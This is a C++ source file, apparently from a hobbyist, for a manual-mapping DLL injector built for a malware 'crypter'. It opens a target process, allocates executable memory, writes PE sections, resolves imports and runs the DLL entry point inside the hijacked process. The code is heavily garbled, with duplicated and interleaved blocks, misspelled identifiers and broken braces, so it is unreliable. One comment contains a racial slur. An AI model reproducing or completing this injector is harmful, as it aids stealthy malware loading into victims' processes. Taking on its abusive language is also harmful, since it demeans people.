//this is a manual mapper made by r0x
//for the CRYPTER BY NIGHTMARE 
//looking at this I HATE THE CODE ALREADY
//just sending this to you so you can see what i did, im likely gonna send a better version later
#include "bussdownrolly.h"
#include <array>
#include <windows.h>

static const inline bool
isCorrectTargetArchitecture(HANDLE target)
{
    BOOL host;
    IsWow64Process(GetCurrentProcess(), &host);
    if (host == TRUE)
    {
        cout << "64 bit process detected" << endl;
    }
    else
    {
        cout << "32 bit process detected" << endl;
    }
    return target == host;
}
BOOl target = FALSE;
if (!IsWow64Process(process, &target))//this is to check if the process im targetting is 32 bits ^_^

std::throw_with_nested(std::runtime_error("Target process is not the same architecture as the host process."));
//this is to check if the process im targetting is 32 bits ^_^
GetLastError()));


BOOL host = FALSE;//setting the host var to false
IsWow64Process(GetCurrentProcess(), &host);//checking if the host is 64 bit
return (target == host);//returning the target results
}
bustdownrolly::bustdownrolly(Processinfo processInfo,
std::vector<uint8_t> _file)

//get the process handle of the target process
process{ OpenProcess(PROCESS_VM_READ | PROCESS_V_WRITE | PROCESS_VM_OPERATION | processInfo.pid) } //get the handle of the process

    thread{ OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE,processInfo.tid) }
    //get the thread handle of the target process
    file{ std::move(_file) }//get the file of the target process
    file{ _file }, srcData{ _file.data() }, size{ _file.size() }//get the file of the target process

    {
        if (!process)
        {
            throw std::runtime_error("Failed to open target process.");
        }
    }


    std::throw_with_nested(std::runtime_error("failed to open target thread.")); //throwing an error if the thread is not opened
    }
    std::throw_with_nested(std::runtime_error("failed to open target file.")); //throwing an error if the file is not opened
    }

    if (!isCorrectTargetArchitecture(process))
    {
        throw std::runtime_error("Target process is not the same architecture as the host process.");
    }

    const auto oldNtHeader{
        reinterpret_cast<PIMAGE_NT_HEADERS>(srcData + reinterpret_cast<PIMAGE_DOS_HEADER>(srcData)->e_lfanew)
    };//getting the old header of the target process
    }
    //if youre reading this i love you
    const auto oldImageSize{ oldOptHeader{ &oldNtHeader->OptionalHeader };//getting the old image size of the target process
    }
    const auto oldFileHeader{ &oldNtHeader->FileHeader };//getting the old file header of the target process
    }//getting the old file header of the target process

    if (oldFileHeader->Machine != IMAGE_FILE_MACHINE_I386)

    std::throw_with_nested(std::runtime_error("architecture is not 32bit dll."));

        

    targetBase =
    reinterpret_cast<std::byte*>
    (VirtualAllocEx(process,reinterpret_cast<void*>(oldOptHeader->ImageBase),oldImageSize,MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));
    //allocating memory for the target process
    if (!targetBase)
    {
    throw std::runtime_error("Failed to allocate memory in codecave." + GetLastError()));//nigga you should know what this is doing by now

    }


template<typename... Ts>

constexpr std::array<std::byte, sizeof...(Ts)> make_bytes(Ts&&.. args) {
    (//make byte array) //i need to cange this
    return{ std::byte(std::foward<Ts>)}
    (args))... };
    //here im just returning the byte array
    template<typename T> //make a byte array
constexpr auto RELOC_FLAG(T RelInfo) { return ((RelInfo >> 0x0C) == IMAGE_REL_BASED_HIGHLOW); } //check if the relocation flag is correct

static constexpr void __stdcall mapper(MANUAL_MAPPING_DATA* data)//map the dll
{
    if (!data)//check if the data is valid
        return;//return

    const auto base{ reinterpret_cast<std::byte*>(data) };//get the base address of the target process
    const auto opt{ &reinterpret_cast<IMAGE_NT_HEADERS*>(base + reinterpret_cast<IMAGE_DOS_HEADER*>(data)->e_lfanew)->OptionalHeader };//get the optional header of the target process

    const auto _LoadLibraryA{ data->LoadLibraryA };//get the loadlibrarya function
    if (!_LoadLibraryA) { //check if the loadlibrarya function is valid
        return; 
    }
    consg auto _dllain{
        reinterpret_cast<_DLL_ENTRY_POINT>(base + opt->AddressOfEntryPoint) };//get the dll entry point
    if (!_dllain) {//check if the dll entry point is valid
        return;
         const auto locationDelta{ base - opt->ImageBase }; //get the location delta
    if (locationDelta) {//check if the location delta is valid
    {
        if(!opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) //check if the relocation size is valid
        {
            return;
        }
        auto relocData{
            reinterpret_cast<IMAGE_BASE_RELOCATION*>(base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) };//get the relocation data
            
            while (relocData->VirtualAddress) {//check if the relocation data is valid
                const auto count{ (relocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD) };//get the count of the relocation data
                const auto list{ reinterpret_cast<WORD*>(relocData + 1) };//get the list of the relocation data
                for (size_t i{}; i < count; ++i) {//check if the count is valid
                    if (RELOC_FLAG(list[i])) {//check if the relocation flag is valid
                        const auto ptr{ base + relocData->VirtualAddress + (list[i] & 0xFFF) };//get the pointer of the relocation data
                        *reinterpret_cast<ptrdiff_t*>(ptr) += locationDelta;//get the pointer of the relocation data
                        auto amountOfEntries{ (relocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(unsigned short) }; //   get the amount of entries
            auto relativeInfo{ reinterpret_cast<unsigned short*>(relocData + 1) }; //get the relative info

            for (unsigned int i = 0; i != amountOfEntries; ++i, ++relativeInfo) //loop through the entries
            {
                if (RELOC_FLAG(*relativeInfo)) //check if the relocation flag is valid
                {
                    auto patch{ reinterpret_cast<uintptr_t*>(base + relocData->VirtualAddress + ((*relativeInfo) & 0xFFF)) }; //get the patch
                    *patch += reinterpret_cast<uintptr_t>(locationDelta); //add the location delta to the patch

                    }

                }
                relocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<std::byte*>(relocData) + relocData->SizeOfBlock);//get the relocation data
            }
            relocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>
            (reinterpret_cast
                <std::byte*>(relocData) + relocData->SizeOfBlock);//get the base relocation

                if (opt->DataDirectory[IMAE_DIRECTORY_ENTRY_IMPORT].Size) //check if the siz if the import is valid
                {
                    auto importDescr{ reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) };//get the import descriptor
                    while (importDescr->Name) {//check if the import descriptor is valid
                        const auto name{ reinterpret_cast<char*>(base + importDescr->Name) };//get the name of the import descriptor
                        const auto lib{ _LoadLibraryA(name) };//get the library of the import descriptor
                        auto thunk{ reinterpret_cast<IMAGE_THUNK_DATA*>(base + importDescr->OriginalFirstThunk) };//get the thunk of the import descriptor
                        auto iat{ reinterpret_cast<IMAGE_THUNK_DATA*>(base + importDescr->FirstThunk) };//get the iat of the import descriptor
                        if (!thunk) {//check if the thunk is valid
                            thunk = iat;
                        }
                        if (!iat) {//check if the iat is valid
                            iat = thunk;
                        }
                        while (thunk->u1.AddressOfData) {//check if the thunk is valid
                            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {//check if the ordinal flag is valid
                                const auto proc{ _GetProcAddress(lib, reinterpret_cast<char*>(thunk->u1.Ordinal & 0xFFFF)) };//get the process
                                if (!proc) {//check if the process is valid
                                    return;
                                }
                                iat->u1.Function = reinterpret_cast<uintptr_t>(proc);//get the iat
                            }
                            else {
                                const auto import{ reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(base + thunk->u1.AddressOfData) };//get the import
                                const auto proc{ _GetProcAddress(lib, import->Name) };//get the process
                                if (!proc) {//check if the process is valid
                                    return;
                                }
                                iat->u1.Function = reinterpret_cast<uintptr_t>(proc);//get the iat
                            }
                            ++thunk;//increment the thunk
                            ++iat;//increment the iat
                        }
                        ++importDescr;//increment the import descriptor
                        const char* module{
                            reinterpret_cast<char*>(base + importDesr->Name) };
                            const auto dll{
                                _LoadLibraryA(module) }; //load the module

                                auto thunkRef{
                                    reinterpret_cast<uintptr_t*>(base +
                                    importDescr->OrginalFirstThunk) };
                                    
                                    if(!thunkRef) //check if its valid
                                    {
                                        thunkRef = reinterpret_cast<uintptr_t*>(funcref);

                                    }

                                }
                            }{
                                if ((IMAGE_SNAP_BY_ORDINAL(*thunkRef))
                                
                                {
                                    *funcRef =
                                    _GetProcAddress(dll,reinterpret_cast<char*>(*thunkRef & 0xFFFF)); 

                                } 
                                else
                                }))
                                {
                                    const auto import{
                                        reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(base + *thunkRef) };
                                        *funcRef = _GetProcAddress(dll, import->Name);
                                    }
                                    ++thunkRef;
                                    ++funcRef;

                                }
                                ++importDescr

                            }
                        }
                        if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].
                        Size)
                        
                        {
                            const auto tls{ //get tls
                                reinterpret_cast<IMAGE_TLS_DIRECTORY*>//get tls directory
                                (base + opt->DataDiretory[IMAGE_DIRECTORY_ENTRY_TLS].//get tls directory
                                VirtualAddress)) }; get callback//get callback
                                const auto callback{ //get callback
                                    reinterpret_cast<PIMAGE_TLS_CALLBACK*>//get callback
                                    (tls->AddressOfCallBacks) }; //get callback
                                    for (; *callback; ++callback) { //loop through the callback
                                        (*callback)(base, DLL_PROCESS_ATTACH, nullptr); //call the callback
                                    
                                    }
                                }


                            }
                        })
                    }
                    
            //
                }

           }
                else //if the thunk ref is not valid
                {
                    const auto import{ reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(base + (*thunkRef)) }; //get the import
                    *funcRef = _GetProcAddress(dll, import->Name); //get the function ref
                }
                ++thunkRef; //increment the thunk ref
                ++funcRef; //increment the function ref
            }
            ++importDescr; //increment the import descriptor
        }
    }

    if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) //  check if the size of the tls is valid
    {
        const auto tls{ reinterpret_cast<IMAGE_TLS_DIRECTORY*>(base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress) }; //get the tls
        auto callback{ reinterpret_cast<PIMAGE_TLS_CALLBACK*>(tls->AddressOfCallBacks) }; //get the callback
        while (callback && *callback)
            (*callback++)(base, DLL_PROCESS_ATTACH, nullptr); //call the callback
    }
    _dllMain(base, DLL_PROCESS_ATTACH, nullptr); //call the dllmain

    for (unsigned int i = 0; i != 0x1000; i += sizeof(unsigned long)) //loop through the memory
        *reinterpret_cast<unsigned long*>(base + i) = 0; //set the memory to 0




    const auto timer{ GetTickCount64() }; //get the tick count
    unsigned char checkByte{ 1 }; //get the check byte

    do
    {
        ReadProcessMemory(process, reinterpret_cast<std::byte*>(codeCave) + checkByteOffset, &checkByte, 1, nullptr); //read the memory of the codecave

        if (GetTickCount64() - timer > 5000)//check if the timeout is valid
        {
            VirtualFreeEx(process, codeCave, 0, MEM_RELEASE); //free the memory of the codecave
            std::throw_with_nested(std::runtime_error("Error: Hijacking timeout: " + GetLastError())); //print error message
        }

        Sleep(10); //sleep for 10 ms
    } while (checkByte); //loop until the check byte is valid

    ReadProcessMemory(process, codeCave, &checkByte, sizeof(checkByte), nullptr); //read the memory of the codecave
    VirtualFreeEx(process, codeCave, 0, MEM_RELEASE);//free the memory of the codecave
    return true;//return true

//ikik the code is a MESS but it works so i dont care
//fix anything you see wrong 
bool MMap::run() //run the dll
 {
    const auto oldNtHeader{ reinterpret_cast<IMAGE_NT_HEADERS*>(srcData + reinterpret_cast<IMAGE_DOS_HEADER*>(srcData)->e_lfanew) }; //get the nt header of the target process
    const auto oldOptHeader{ &oldNtHeader->OptionalHeader }; //get the optional header of the target process
    const auto oldFileHeader{ &oldNtHeader->FileHeader }; //get the file header of the target process

    auto sectionHeader = IMAGE_FIRST_SECTION(oldNtHeader); //get the section header of the target process
    for (unsigned short i = 0; i != oldFileHeader->NumberOfSections; ++i, ++sectionHeader) //loop through the sections
    {
        if (sectionHeader->SizeOfRawData) //check if the size of the raw data is valid
        {
            if (!WriteProcessMemory(process, targetBase + sectionHeader->VirtualAddress, srcData + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, nullptr)) //write the memory of the target process
            {
                VirtualFreeEx(process, targetBase, 0, MEM_RELEASE); //free the memory of the target process
                std::throw_with_nested(std::runtime_error("Error: Failed to write section: " + GetLastError())); //print error message
 }
            {
                VirtualFreeEx(process, targetBase, 0, MEM_RELEASE);//free the memory of the target process
                std::throw_with_nested(std::runtime_error("Error: MMAP failed: " + GetLastError()));//print error message
            }
        }
        }    }
}
